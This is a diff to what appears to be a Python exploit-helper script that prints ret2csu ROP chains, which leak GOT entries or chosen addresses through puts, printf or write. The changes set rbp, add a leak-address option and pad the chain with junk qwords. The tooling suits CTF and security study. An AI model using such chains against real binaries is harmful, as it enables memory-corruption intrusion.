@@ -25,7 +25,7 @@ if "puts" in binary.got:
     print "rop = ''"
     print "rop += p64(0x%x) # gadget 1" % gadget1
     print "rop += p64(0) # rbx"
-    print "rop += p64(0) # rbp"
+    print "rop += p64(1) # rbp"
     print "rop += p64(0x%x) # r12 [puts@got]" % binary.got["puts"]
     print "rop += p64(0) # r13"
     print "rop += p64(0) # r14"
@@ -34,6 +34,13 @@ if "puts" in binary.got:
     else:
         print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
     print "rop += p64(0x%x) # gadget 2" % gadget2
+    print "rop += p64(0) # junk to reach the next gadget"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
 elif "printf" in binary.got:
     #r12 = printf@plt
     #rbx = 0
@@ -45,8 +52,18 @@ elif "printf" in binary.got:
     print "rop += p64(0x%x) # r12 [printf@got]" % binary.got["printf"]
     print "rop += p64(0) # r13"
     print "rop += p64(0) # r14"
-    print "rop += p64(0x%x) # r15 [printf@got]" % binary.got["printf"]
+    if to_leak == None:
+        print "rop += p64(0x%x) # r15 [printf@got]" % binary.got["printf"]
+    else:
+        print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
     print "rop += p64(0x%x) # gadget 2" % gadget2
+    print "rop += p64(0) # junk to reach the next gadget"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
 elif "write" in binary.got:
     #r12 = write@plt
     #rbx = 0
@@ -59,9 +76,18 @@ elif "write" in binary.got:
     print "rop += p64(0) # rbp"
     print "rop += p64(0x%x) # r12 [write@got]" % binary.got["write"]
     print "rop += p64(8) # r13 [sizeof void*]"
-    print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
+    if to_leak == None:
+        print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
+    else:
+        print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
     print "rop += p64(1) # r15 [stdout]"
     print "rop += p64(0x%x) # gadget 2" % gadget2
-
+    print "rop += p64(0) # junk to reach the next gadget"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
+    print "rop += p64(0) # junk"
 
 
